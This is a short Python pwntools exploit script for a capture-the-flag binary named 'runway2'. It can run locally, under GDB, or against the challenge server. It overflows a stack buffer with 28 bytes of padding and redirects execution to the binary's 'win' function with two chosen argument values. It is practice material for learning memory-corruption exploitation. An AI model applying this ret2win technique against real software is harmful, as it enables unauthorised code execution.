from pwn import *
from icecream import ic

elf = exe = ELF("./runway2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.pwnoh.io", 13402)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *get_answer
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

payload = flat(
    'a' * 28,
    elf.sym['win'],
    elf.sym['main'],
    0xc0ffee,
    0x007ab1e
)

sl(payload)
io.interactive()
